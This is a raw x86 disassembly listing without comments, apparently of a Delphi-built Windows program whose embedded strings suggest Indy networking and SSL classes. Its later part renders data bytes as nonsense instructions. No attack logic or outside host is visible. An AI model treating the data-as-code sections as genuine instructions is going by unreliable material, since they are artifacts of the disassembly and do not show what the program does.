test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x10 ]
call sub_404edc
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404edc
jmp r-xdata
mov eax ebx
call sub_403f64
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test al al
je r-xdata
lea eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_404e98
mov edx [ ebp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax ebx
call sub_403f64
jmp r-xdata
mov edx ebx
mov eax [ esi + 0x48 ]
call sub_483fc4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4846c9
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp + 0x8 ]
call sub_404e44
retn
sub_4846d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405314
mov eax [ ebp - 0x8 ]
call sub_405314
xor eax eax
push ebp
push sub_484734
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x48 ]
call sub_4840ac
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
mov edx eax
mov eax ebx
call sub_4845f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48473b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
sub_484740
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405314
mov eax [ ebp - 0x8 ]
call sub_405314
xor eax eax
push ebp
push sub_4847a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x48 ]
call sub_4840bc
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
mov edx eax
mov eax ebx
call sub_4845f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4847a7
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
sub_4847ac
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x42 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_484800
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_484956
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x48 ]
mov dl 0x1
call sub_4840cc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_484939
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484940
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x48 ]
mov dl 0x1
call sub_4840f0
retn
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
sub eax 0x1
jno r-xdata
test eax eax
jl r-xdata
call sub_403e34
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] 0x0
cmp ebx 0x0
jl r-xdata
call sub_403e34
inc [ ebp - 0xc ]
dec [ ebp - 0x14 ]
jne r-xdata
mov edx ebx
mov eax esi
call sub_482f74
mov edx [ eax + 0x14 ]
lea eax [ ebp - 0x4 ]
call sub_404edc
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jle r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_404114
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
sub ebx 0x1
jno r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_470cf0
fstp [ ebp - 0x1c ]
fwait
mov eax [ r-xdata ]
call sub_4626ec
fcomp [ ebp - 0x1c ]
fwait
fnstsw ax
sahf
jbe r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov edx ebx
mov eax esi
call sub_482f74
call sub_403f64
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp edi eax
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_484964
push ebx
mov ebx eax
mov eax ebx
call sub_4650ac
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_483ef0
mov [ ebx + 0x48 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
pop ebx
retn
sub_484a7c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
xor eax eax
push ebp
push sub_484c2b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
push 0x2
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
push 0x1
lea eax [ ebp - 0xc ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
push 0x0
push 0x3
mov eax [ ebx ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
push 0x1
push 0x0
lea ecx [ ebp - 0x4 ]
mov edx [ ebx ]
mov eax [ r-xdata ]
call sub_463544
push 0x0
push 0x6
mov eax [ ebx ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor eax eax
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
and al 0x4
cmp al 0x4
jne r-xdata
xor eax eax
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0xc ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4649c8
movzx eax ax
xor edx edx
push edx
push eax
mov eax [ ebx ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
and al 0x8
cmp al 0x8
jne r-xdata
xor eax eax
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0xc ]
xor eax eax
mov edx [ ebp - 0xc ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
and al 0x10
cmp al 0x10
jne r-xdata
cmp [ edx + eax ] 0x0
jne r-xdata
xor eax eax
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0xc ]
xor eax eax
mov edx [ ebp - 0xc ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
and al 0x2
cmp al 0x2
jne r-xdata
cmp [ edx + eax ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484c32
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
mov ecx 0x3
call sub_405af0
retn
push 0x0
push 0x2
mov eax [ ebx ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
sub_484c38
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_484d1e
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
call sub_484a7c
pop ecx
push 0xffffffff
push 0xfffffffe
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
push 0x2
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor eax eax
mov edx [ ebp - 0x8 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ edx + eax ] 0x78
mov eax 0x1
mov edx [ ebp - 0x8 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ edx + eax ] 0x9c
push 0x2
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_463610
push 0xffffffff
push 0xfffffffe
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
sub eax 0x8
sbb edx 0x0
jno r-xdata
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_419344
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484d25
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_406410
retn
call sub_403e34
sub_484d2c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
push 0xa
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
retn
sub_484d54
mov al [ 0x484d ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx * 2 + 0x80048 ] ah
add [ eax ] al
mov esp 0xac004010
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax + 0x4e ] ah
dec eax
add [ esi + ecx * 2 ] bl
dec eax
add [ 0x54644954 ] cl
loop r-xdata
jb r-xdata
rol [ eax - 0x3974031e ] cl
call sub_403f54
test bl bl
jle r-xdata
mov eax esi
push 0x64616572
push ebx
popad
mov ax ax
add [ esi + 0x48 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 2 ] al
dec eax
add [ eax + eax ] cl
add [ eax ] al
push esp
dec ebp
dec eax
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax + 0x4e ] ah
dec eax
add [ esi + ecx * 2 ] bl
dec eax
add [ esp + edx * 2 ] dl
dec ecx
push esp
push 0x64616572
push ebx
popad
dec cx
outsb
je r-xdata
push esp
inc eax
add [ ebx + 0x56 ] dl
test dl dl
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403f34
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a970
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_484e1c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403f34
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a970
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_484e60
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
lea edx [ esi + 0x4 ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_484e94
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_484eb9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484ec0
retn
sub_484ec8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ edi + 0x48 ] cl
add [ eax + 0x4f ] bh
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x4f ] ah
dec eax
add [ eax ] ch
add [ eax ] al
add [ ebx + eax * 2 + 0x41ac0041 ] ah
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ eax ] al
push cs
add [ edx + esi * 2 + 0x72dc0041 ] ch
inc ecx
add ah dl
jb r-xdata
inc eax
add [ eax + 0x73 ] bl
inc ecx
add [ esi + ebp * 2 + 0x6eb40041 ] ch
inc ecx
add ah al
jae r-xdata
jns r-xdata
outsb
je r-xdata
inc ebp
add [ eax ] ch
jno r-xdata
call 0x8489888
add al bl
ja r-xdata
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax + 0x71 ] ah
inc ecx
add [ esi + ebp * 2 + 0x6eb40041 ] ch
inc ecx
add al cl
insd
inc ecx
add ah cl
jno r-xdata
inc eax
add [ eax + 0x4f ] bh
dec eax
add [ edi ] al
push cs
push esp
dec ecx
push ebx
push ebx
dec esp
push edx
inc ebp
outsb
je r-xdata
push esp
dec ecx
push ebx
push ebx
dec esp
push edx
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ 0xffffffffb0000000 ] al
adc [ eax ] al
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x14004010 ] dh
add [ eax ] al
add [ eax + 0x18004010 ] dh
add [ eax ] al
add [ eax + 0x1c004010 ] dh
add [ eax ] al
add [ esi ] cl
add [ eax ] al
add [ 0x53536449 ] al
or [ ebp + 0x41 ] al
add ah bl
ja r-xdata
jns r-xdata
dec esp
add [ eax ] al
add eax 0x53536449
add al ah
ja r-xdata
add [ ebx + 0x484fe8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 2 ] ah
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
push eax
dec eax
add [ eax ] bl
add [ eax ] al
add [ esp + eax * 2 + 0x41 ] bl
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
dec edi
dec eax
add [ eax ] dh
inc esp
inc ecx
add [ eax ] al
add [ 0x53536449 ] al
dec esp
add [ eax ] al
mov eax eax
call sub_4897f0
push ebx
push ebx
add al dl
ja r-xdata
add [ eax ] al
mov eax eax
add ah dl
ja sub_485048
add [ esp + esi * 2 + 0x41 ] bl
add al bl
je r-xdata
inc ebp
inc ecx
add [ esi ] cl
push esp
dec ecx
push ebx
push ebx
dec esp
push edx
imul esi [ gs : bp + di + 0x74 ] 0x24907972
push eax
dec eax
add [ edi ] al
push cs
push esp
dec ecx
push ebx
push ebx
dec esp
push edx
imul esi [ gs : bp + di + 0x74 ] 0x4fe87972
dec eax
add [ eax ] cl
sub_485048
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax esi
call sub_41730c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_485084
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4850ba
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4850c1
retn
mov edx rw-data
mov eax [ r-xdata ]
call sub_462560
sub_4850c8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x51
dec eax
add [ eax + 0x4851 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x51 ] ch
dec eax
add [ esi + 0x51 ] dh
dec eax
add [ eax ] ch
add [ eax ] al
add [ edx + 0x41 ] al
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add al ch
pop edx
dec eax
add [ eax ] ch
pop ebx
dec eax
add [ esi + ebp * 2 + 0x6dc80041 ] dh
inc ecx
add [ esp + ebx * 2 + 0x48 ] dh
add [ eax + 0x60 ] ah
dec eax
add ah ch
pop ebx
dec eax
add [ eax + 0xe00485a ] al
add [ eax ] al
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax + 0x4004010 ] dh
add [ eax ] al
add [ eax + 0xc004010 ] dh
add [ eax ] al
add [ eax + 0x10004010 ] dh
add [ eax ] al
add [ eax + 0x14004010 ] dh
add [ eax ] al
add [ eax + 0x38004010 ] dh
add [ eax ] al
add [ eax + 0x3c004010 ] dh
add [ eax ] al
add [ eax + 0x60004010 ] dh
add [ eax ] al
add [ ecx ] al
add bh bh
sub_48531d
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
or eax [ ebx + 0x6f ]
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
add al 0x44
outsb
je r-xdata
jb r-xdata
adc [ edx ] dl
popad
je r-xdata
adc [ edx ] dl
inc eax
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4404000b ] al
jns r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x8004010 ] dh
add [ eax ] al
add [ eax + 0x10004010 ] dh
add [ eax ] al
add [ eax + 0x14004010 ] dh
add [ eax ] al
add [ esi ] dl
push esp
dec ecx
push eax
jb r-xdata
insd
popad
lea eax [ eax ]
push esp
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x54 ] dh
dec eax
add [ eax + 0x4854 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x1c004854 ] dl
add [ eax ] al
add [ eax ] al
inc edx
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add al al
arpl [ eax ] cx
push esp
dec eax
add [ eax + eax ] bl
add [ eax ] al
add [ edx + 0x41 ] al
imul esi [ edx + 0x65 ] 0x40121073
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c0c000d ] al
popad
inc eax
add [ eax ] dl
add bh bh
push eax
adc [ gs : edx ] dl
mov al 0x10
inc eax
add [ eax + eax ] bh
add bh bh
cmp al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push cs
inc ebx
outsd
outsb
je r-xdata
push 0x69746e65
js r-xdata
clc
arpl [ eax ] cx
mov ah 0x6e
inc ecx
add al cl
insd
inc ecx
add [ esi ] cl
add [ eax ] al
shl [ ebx + 0x48 ] 0x0
dec ebp
outsd
imul esp [ fs : esi + 0x69 ] 0x10b06465
inc eax
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
js r-xdata
add [ eax ] al
or [ eax + eax ] 0x7
inc ebp
outsb
je r-xdata
jb r-xdata
popad
jae r-xdata
or [ eax ] al
add bh bh
or [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] eax
or eax 0x786f7250
jns r-xdata
adc [ eax ] al
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec ecx
outsb
outsw
lea eax [ eax ]
mov al 0x54
dec eax
add [ edi ] al
push ss
push esp
dec ecx
push eax
jb r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4507000c ] al
jb r-xdata
jae r-xdata
adc [ eax ] al
adc al 0x0
add bh bh
adc al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
popad
insd
ja r-xdata
add [ eax ] al
js r-xdata
jae r-xdata
[ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x614c0c00
imul ebp [ edi + 0x6e ] r-xdata
inc eax
add [ eax ] al
[ eax ]
arpl [ eax ] cx
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
or eax 0x74737543
outsd
insd
dec eax
popad
jb r-xdata
push ebp
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
push esi
dec eax
add [ esi + edx * 2 + 0x48 ] ah
add [ eax ] al
add ah bh
outsd
add [ eax ] cl
push 0x6eb40048
inc ecx
add al cl
insd
inc ecx
add ah bl
dec eax
add [ eax + 0x69 ] ch
dec eax
add ah bl
push 0x5a800048
dec eax
add [ esi ] cl
jae r-xdata
add [ eax ] al
jae r-xdata
jb r-xdata
jb r-xdata
push eax
jb r-xdata
js r-xdata
push eax
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec ecx
outsb
outsw
push esp
dec eax
add [ edx + eax * 2 + 0x41 ] dh
add [ 0x64491000 ] al
dec eax
push esp
push esp
push eax
dec eax
popad
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5006000e ] al
or eax 0x786f7250
jns r-xdata
cmp al 0x10
inc eax
add [ eax + eax ] cl
add bh bh
mov [ ebp + 0x48 ] fs
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090002 ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ 0xffffffffb0000000 ] cl
imul ecx [ eax ] sub_4868dc
sbb [ edx + 0x48 ] 0x0
inc edx
popad
inc ebx
push 0x65537261
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410d0010 ] al
arpl [ ebx + 0x65 ] sp
jo r-xdata
dec eax
popad
jb r-xdata
push cs
dec eax
add [ eax + 0xe00485a ] al
js r-xdata
lea eax [ eax ]
cld
add [ eax + 0x500d0001 ] al
jb r-xdata
outsb
outsw
add eax 0x40100000
add [ eax ] bl
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42130000 ] al
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov dl [ esi + 0x48 ]
js r-xdata
popad
arpl [ ecx + 0x75 ] ax
je r-xdata
dec ecx
adc [ eax ] al
arpl [ ebx + 0x65 ] sp
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sldt [ esi ]
inc ecx
outsb
outsw
nop
movsb [ edi ] [ esi ]
push esi
dec eax
add [ edi ] al
adc al 0x54
dec ecx
push edx
jno r-xdata
adc [ eax ] al
push 0xb0000000
adc [ eax ] al
insb
add [ eax ] al
add [ eax + 0x70004010 ] dh
add [ eax ] al
add [ eax + 0x74004010 ] dh
add [ eax ] al
add [ eax + 0x78004010 ] dh
add [ eax ] al
add [ eax + 0x7c004010 ] dh
add [ eax ] al
add [ eax - 0x7fffbff0 ] dh
add [ eax ] al
add [ eax - 0x7bffbff0 ] dh
add [ eax ] al
add [ eax - 0x77ffbff0 ] dh
add [ eax ] al
add [ eax - 0x73ffbff0 ] dh
add [ eax ] al
add [ eax - 0x6fffbff0 ] dh
add [ eax ] al
add [ eax - 0x6bffbff0 ] dh
add [ eax ] al
add [ eax - 0x67ffbff0 ] dh
add [ eax ] al
add [ esp + edx * 2 ] dl
dec ecx
push edx
jno r-xdata
or eax 0xb0000000
push ebp
add [ eax ] al
add [ eax ] al
arpl [ ecx + 0x75 ] ax
je r-xdata
dec eax
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add al bh
movsb [ edi ] [ esi ]
add [ eax ] al
add ah al
push eax
push eax
outsd
jb r-xdata
add bh bh
xchg esp eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500f001a ] al
jb r-xdata
ja r-xdata
outsd
outsb
je r-xdata
outsb
jne r-xdata
mov al 0x10
inc eax
add [ eax + eax ] ch
[ eax + eax ]
add bh bh
jo r-xdata
inc eax
add [ eax ] dh
jae r-xdata
insb
dec eax
clc
push ebx
jb r-xdata
add [ eax - 0x80000000 ] al
add eax [ eax ]
outsb
je r-xdata
add [ eax + eax + 0x50c40000 ] ah
mov al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
[ ebp + 0x10048 ]
add [ eax ] bl
aas
inc eax
add [ ebp + ebp * 2 + 0x5b280048 ] dh
dec eax
js r-xdata
xchg esp eax
add [ eax ] al
call [ eax + eax + 0x1ff00 ]
jb r-xdata
jb r-xdata
mov al 0x10
inc eax
add [ eax + eax + 0x84ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ edi ] al
push edx
jb r-xdata
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040014 ] al
add [ eax - 0x80000000 ] al
adc eax 0x72460400
outsd
jae r-xdata
add [ gs : bx + si ] dl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
push cs
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
jo r-xdata
dec eax
popad
jb r-xdata
jb r-xdata
or edx [ eax + 0x72 ]
outsd
js r-xdata
add [ ebx ] 0x0
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] r-xdata
add [ edi ] al
adc eax 0x52644954
jae r-xdata
add [ eax ] bh
insd
dec eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add [ eax ] ch
add [ eax ] al
mov al 0x10
inc eax
add [ eax + eax ] ch
add [ eax + 0x70004010 ] dh
add [ eax ] al
add [ eax + 0x74004010 ] dh
add [ eax ] al
add [ 0x52644954 ] dl
jae r-xdata
add [ esi + ebp * 2 + 0x6dc80041 ] dh
inc ecx
add [ esi + ebp * 2 ] dl
dec eax
add [ eax + 0x5000486f ] cl
jno r-xdata
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
mov al 0x10
inc eax
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5205001b ] al
popad
outsb
add [ gs : bx + di + 0x48 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
